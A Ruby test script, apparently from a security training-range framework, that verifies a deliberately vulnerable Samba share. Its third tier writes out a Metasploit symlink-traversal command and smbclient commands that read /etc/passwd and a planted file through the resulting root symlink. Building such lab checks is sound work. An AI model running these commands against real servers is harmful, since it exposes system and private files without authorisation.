require_relative '../../../../../lib/post_provision_test'

class SambaSymlinkTraversalTest < PostProvisionTest
  def initialize
    self.module_name = 'samba_symlink_traversal'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    share_name = self.json_inputs['share_name']&.first
    storage_directory = self.json_inputs['storage_directory']&.first
    pre_leaked_filenames = self.json_inputs['pre_leaked_filenames'] || []

    tier(1) do
      test_local_command('samba installed', 'dpkg -l samba | grep -E "^ii"', 'samba')
      test_local_command('wide links enabled', 'grep "allow insecure wide links" /etc/samba/smb.conf', 'yes')
      if share_name
        test_local_command("share [#{share_name}] in smb.conf", "grep -i '\\[#{share_name}\\]' /etc/samba/smb.conf", share_name)
      end
      if storage_directory
        test_local_command('storage directory exists', "test -d #{Shellwords.escape(storage_directory)} && echo present", 'present')
      end
    end

    tier(2) do
      test_service_up(port: 445)
      test_local_command('share listed anonymously', 'smbclient -L localhost -N', 'Sharename')
      if share_name
        test_local_command("#{share_name} share visible", "smbclient -L localhost -N", share_name)
      end
    end

    # Tier 3: auxiliary/admin/smb/samba_symlink_traversal is an auxiliary module
    # that plants a symlink (rootfs -> /) inside the writable share. It does not
    # execute commands on the target, so test_msf_exploit (which expects a
    # cmd/unix/generic payload and a uid= sentinel) does not apply. Instead:
    #   1. Run the MSF auxiliary from the attacker to plant the symlink.
    #   2. Read /etc/passwd through the symlink via smbclient on the attacker.
    #   3. Optionally verify the pre-leaked file at / is also reachable.
    tier(3) do
      resolved = resolve_attacker('smb symlink traversal', nil, nil, 3)
      next unless resolved
      attacker_name, _attacker_ip, rhost = resolved

      share = share_name || 'public'

      # Step 1: run the MSF auxiliary to plant the rootfs symlink.
      msf_cmd = "export HOME=/root TERM=dumb; msfconsole -q -x " \
                "\"use auxiliary/admin/smb/samba_symlink_traversal; " \
                "set RHOSTS #{msf_set_value(rhost)}; " \
                "set SMBSHARE #{msf_set_value(share)}; " \
                "run; exit -y\""
      msf_result = run_on_system(attacker_name, msf_cmd, timeout: 120)
      msf_out = "#{msf_result[:stdout]}\n#{msf_result[:stderr]}"
      add_evidence('msf_auxiliary_output', "echo #{Shellwords.escape(msf_out[-4000..-1] || msf_out)}")

      # Step 2: prove traversal — read /etc/passwd through rootfs symlink.
      # The auxiliary plants a symlink called 'rootfs' pointing to /. We read
      # rootfs/etc/passwd via smbclient on the attacker.
      smb_read = "smbclient //#{Shellwords.escape(rhost)}/#{Shellwords.escape(share)} " \
                 "-N -c 'get rootfs/etc/passwd -'"
      read_result = run_on_system(attacker_name, smb_read, timeout: 30)
      passwd_body = read_result[:stdout].to_s
      add_evidence('smbclient_passwd', "echo #{Shellwords.escape(passwd_body[0..2000])}")

      if passwd_body.include?('root:')
        pass_check('symlink traversal reads /etc/passwd',
                   "Traversal confirmed: smbclient on #{attacker_name} read /etc/passwd " \
                   "through rootfs symlink on //#{rhost}/#{share}",
                   tier: 3)
      else
        fail_check('symlink traversal reads /etc/passwd',
                   "Could not read /etc/passwd through rootfs symlink. " \
                   "smbclient output: #{passwd_body[0..500]}. See msf_auxiliary_output evidence.",
                   tier: 3)
      end

      # Step 3: if a pre-leaked file exists at /, verify it is also reachable.
      if pre_leaked_filenames.first
        leaked_name = pre_leaked_filenames.first
        smb_leaked = "smbclient //#{Shellwords.escape(rhost)}/#{Shellwords.escape(share)} " \
                     "-N -c 'get rootfs/#{Shellwords.escape(leaked_name)} -'"
        leaked_result = run_on_system(attacker_name, smb_leaked, timeout: 30)
        leaked_body = leaked_result[:stdout].to_s
        add_evidence('smbclient_leaked_file', "echo #{Shellwords.escape(leaked_body[0..2000])}")

        # The pre-leaked file is owned root:root mode 0660 by default, so the
        # anonymous samba guest (nobody) may not be able to read it. Record as
        # evidence but do not fail on it — the /etc/passwd check is the primary
        # traversal proof; this is a bonus when permissions allow.
        if leaked_body.length > 0 && leaked_result[:exit_status] == 0
          pass_check("pre-leaked file /#{leaked_name} readable via traversal",
                     "Read #{leaked_body.length} bytes from /#{leaked_name} through rootfs symlink",
                     tier: 3)
        else
          skip_check("pre-leaked file /#{leaked_name} readable via traversal",
                     "File at /#{leaked_name} not readable through traversal (likely 0660 permissions); " \
                     "/etc/passwd traversal is the primary proof",
                     tier: 3)
        end
      end
    end

    # Inputs not checked (no observable target-side effect from the test):
    #   share_comment    — cosmetic label in smb.conf, not separately verified
    #   read_only_share  — the auxiliary module needs write access to plant the
    #                      symlink; the default (false) is required for tier 3
    #   guests_allowed   — anonymous access is exercised implicitly (smbclient -N)
    #   strings_to_leak, leaked_filenames, images_to_leak — leaked into the share
    #                      directory; verifying them is a leak-content check, not a
    #                      traversal check
    #   strings_to_pre_leak — content of the pre-leaked file (checked indirectly
    #                         if the bonus read succeeds)
    #   organisation     — overrides share_name/share_comment when set; the test
    #                      reads share_name from json_inputs, so it follows the
    #                      override
  end
end

SambaSymlinkTraversalTest.new.run
